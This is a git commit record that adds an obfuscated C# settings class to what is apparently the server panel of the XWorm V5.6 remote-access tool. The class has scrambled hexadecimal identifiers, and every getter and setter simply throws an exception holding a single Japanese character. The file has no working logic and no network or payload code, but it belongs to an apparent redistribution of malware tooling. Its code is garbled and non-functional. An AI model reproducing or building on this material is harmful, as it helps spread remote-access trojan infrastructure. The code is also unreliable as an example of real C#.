5f2551709e8559d1baffb14434d20fcb1d9cdae5
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:51:55 +0400

    Forms67.cs

---
+++ XWorm V5.6/Server/Forms/Forms67.cs
@@ -0,0 +1,53 @@
+﻿using System;
+using System.CodeDom.Compiler;
+using System.ComponentModel;
+using System.Configuration;
+using System.Runtime.CompilerServices;
+using System.Windows.Forms;
+
+namespace V462540EVV6738320BEAVB181B7B6441
+{
+  [CompilerGenerated]
+  [GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "16.10.0.0")]
+  [EditorBrowsable(EditorBrowsableState.Advanced)]
+  internal sealed class VEF87313E4DDFCV3A9EE7908EAV73C56 : ApplicationSettingsBase
+  {
+    private IContainer UCED87F73F99FB23332EF743E525F1AF;
+
+    public static VEF87313E4DDFCV3A9EE7908EAV73C56 Default
+    {
+      [SpecialName, MethodImpl(MethodImplOptions.NoInlining)] get
+      {
+        try
+        {
+        }
+        finally
+        {
+label_2:
+          throw new Exception("ぶ");
+        }
+        goto label_2;
+      }
+    }
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual ListView get_ListView1() => throw new Exception("に");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_ListView1(ListView WithEventsValue) => throw new Exception("ゆ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    internal virtual ColumnHeader get_ColumnHeader1() => throw new Exception("け");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)]
+    internal virtual void set_ColumnHeader1(ColumnHeader WithEventsValue) => throw new Exception("だ");
+  }
+}
